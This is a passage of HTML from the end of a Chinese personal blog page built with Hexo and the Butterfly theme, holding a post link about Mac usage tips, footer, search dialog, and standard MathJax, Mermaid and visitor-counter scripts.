class="content"><a class="title" href="/2022/02/20/Mac-%E6%B7%B1%E5%BA%A6%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" title="Mac 深度使用技巧">Mac 深度使用技巧</a><time datetime="2022-02-20T14:38:23.000Z" title="发表于 2022-02-20 22:38:23">2022-02-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By MingwHuang</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a><span class="footer-separator">|</span><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2022001353号-1</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>(() => {
  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaidWrap.length) {
    window.runMermaid = () => {
      window.loadMermaid = true
      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

      Array.from($mermaidWrap).forEach((item, index) => {
        const mermaidSrc = item.firstElementChild
        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
        const mermaidID = 'mermaid-' + index
        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
        })
      })
    }

    const loadMermaid = () => {
      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
    }

    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>